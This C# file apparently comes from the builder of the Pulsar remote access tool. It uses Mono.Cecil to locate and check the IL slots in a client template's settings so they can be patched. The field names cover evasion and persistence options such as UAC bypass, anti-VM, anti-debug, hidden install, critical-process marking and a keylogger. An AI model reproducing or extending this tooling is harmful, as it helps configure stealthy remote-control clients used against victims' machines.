using Mono.Cecil;
using Mono.Cecil.Cil;
using System;
using System.Collections.Generic;
using System.Linq;

namespace Pulsar.Server.Build
{
    public static class ClientSettingsLayout
    {
        public const int Version = 1;

        public static readonly string[] StringFields =
        {
            "VERSION",
            "HOSTS",
            "SUBDIRECTORY",
            "INSTALLNAME",
            "MUTEX",
            "STARTUPKEY",
            "ENCRYPTIONKEY",
            "TAG",
            "LOGDIRECTORYNAME",
            "SERVERSIGNATURE",
            "SERVERCERTIFICATESTR",
            "INSTALLPATH",
            "LOGSPATH"
        };

        public static readonly string[] BooleanFields =
        {
            "INSTALL",
            "STARTUP",
            "HIDEFILE",
            "ENABLELOGGER",
            "HIDELOGDIRECTORY",
            "HIDEINSTALLSUBDIRECTORY",
            "ANTIVM",
            "ANTIDEBUG",
            "PASTEBIN",
            "UACBYPASS",
            "MAKEPROCESSCRITICAL",
            "INSTALLSERVICE",
            "SHOWCLIENTGUI"
        };

        public static SettingsInstructions GetInstructions(AssemblyDefinition assembly)
        {
            if (assembly == null)
                throw new ArgumentNullException(nameof(assembly));

            var settingsType = assembly.Modules
                .SelectMany(module => module.Types)
                .SingleOrDefault(type => type.FullName == "Pulsar.Client.Config.Settings");

            if (settingsType == null)
                throw new InvalidOperationException("client template does not contain Pulsar.Client.Config.Settings");

            var initializer = settingsType.Methods.SingleOrDefault(method => method.Name == ".cctor");
            if (initializer?.Body == null)
                throw new InvalidOperationException("Settings has no static constructor");

            return GetInstructions(initializer);
        }

        public static SettingsInstructions GetInstructions(MethodDefinition initializer)
        {
            if (initializer == null)
                throw new ArgumentNullException(nameof(initializer));

            var stringSlots = GetSlots(initializer, instruction => instruction.OpCode == OpCodes.Ldstr);
            var booleanSlots = GetSlots(initializer, instruction =>
                instruction.OpCode == OpCodes.Ldc_I4_0 || instruction.OpCode == OpCodes.Ldc_I4_1);
            var delaySlots = GetSlots(initializer, instruction => instruction.OpCode == OpCodes.Ldc_I4);
            var folderSlots = GetSlots(initializer, instruction => instruction.OpCode == OpCodes.Ldc_I4_S);

            AssertOrder("string", stringSlots, StringFields);
            AssertOrder("boolean", booleanSlots, BooleanFields);
            AssertOrder("delay", delaySlots, new[] { "RECONNECTDELAY" });
            AssertOrder("folder", folderSlots, new[] { "SPECIALFOLDER" });

            return new SettingsInstructions(
                stringSlots.Select(slot => slot.Value).ToArray(),
                booleanSlots.Select(slot => slot.Value).ToArray(),
                delaySlots.Single().Value,
                folderSlots.Single().Value);
        }

        private static List<FieldSlot> GetSlots(
            MethodDefinition initializer,
            Func<Instruction, bool> isValue)
        {
            var slots = new List<FieldSlot>();
            var instructions = initializer.Body.Instructions;

            for (var i = 0; i + 1 < instructions.Count; i++)
            {
                if (!isValue(instructions[i]))
                    continue;

                var field = instructions[i + 1].Operand as FieldReference;
                if (instructions[i + 1].OpCode != OpCodes.Stsfld || field == null)
                    throw new InvalidOperationException(
                        $"expected the constant at IL_{instructions[i].Offset:x4} to initialize a static field");

                slots.Add(new FieldSlot(field.Name, instructions[i]));
            }

            return slots;
        }

        private static void AssertOrder(string kind, IList<FieldSlot> actual, string[] expected)
        {
            var actualNames = actual.Select(slot => slot.FieldName).ToArray();
            if (actual.Count != expected.Length || !actualNames.SequenceEqual(expected, StringComparer.Ordinal))
            {
                throw new InvalidOperationException(
                    $"client Settings {kind} layout changed: expected [{string.Join(", ", expected)}], " +
                    $"found [{string.Join(", ", actualNames)}]");
            }
        }

        private sealed class FieldSlot
        {
            public FieldSlot(string fieldName, Instruction value)
            {
                FieldName = fieldName;
                Value = value;
            }

            public string FieldName { get; }
            public Instruction Value { get; }
        }
    }

    public sealed class SettingsInstructions
    {
        public SettingsInstructions(
            Instruction[] strings,
            Instruction[] booleans,
            Instruction delay,
            Instruction specialFolder)
        {
            Strings = strings;
            Booleans = booleans;
            Delay = delay;
            SpecialFolder = specialFolder;
        }

        public Instruction[] Strings { get; }
        public Instruction[] Booleans { get; }
        public Instruction Delay { get; }
        public Instruction SpecialFolder { get; }
    }
}
